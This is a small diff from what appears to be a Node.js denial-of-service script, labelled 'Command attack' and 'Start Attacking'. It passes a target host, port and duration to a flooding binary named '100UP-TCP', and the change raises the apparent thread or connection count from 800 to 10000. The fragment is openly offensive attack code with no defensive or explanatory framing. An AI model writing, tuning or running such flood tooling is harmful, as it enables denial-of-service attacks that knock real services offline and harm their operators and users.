@@ -73,7 +73,7 @@ if(!args[0]) {
 
 // Command attack
 var exec = require('child_process').exec
-exec(`./100UP-TCP GET ${host} ${port} ${time} 800`, (error, stdout, stderr) => {
+exec(`./100UP-TCP GET ${host} ${port} ${time} 10000`, (error, stdout, stderr) => {
 });
 
 // Start Attacking
